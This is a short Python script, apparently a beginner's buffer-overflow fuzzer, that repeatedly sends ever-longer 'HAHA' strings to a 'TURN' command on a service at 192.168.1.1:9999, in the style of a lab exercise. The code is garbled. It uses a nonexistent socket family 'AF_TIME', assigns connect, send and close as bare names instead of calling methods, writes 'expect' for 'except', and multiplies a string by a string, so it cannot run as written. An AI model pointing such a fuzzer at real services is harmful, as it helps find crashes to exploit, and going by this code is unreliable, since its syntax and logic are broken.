#!/usr/bin/bof.py

import sys , socket
from time import sleep

buffer = "HAHA" * 100

while True: 
	try:
		s=socket.socket(socket.AF_TIME ,socket.SOCK_STREAM)
		s=connect(('192.168.1.1' , 9999))
		s=send(('TURN /.:/' + buffer))
		s=close()
		sleep(1)
		buffer = buffer * "HAHA"*100
	expect
		print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
		sys.exit()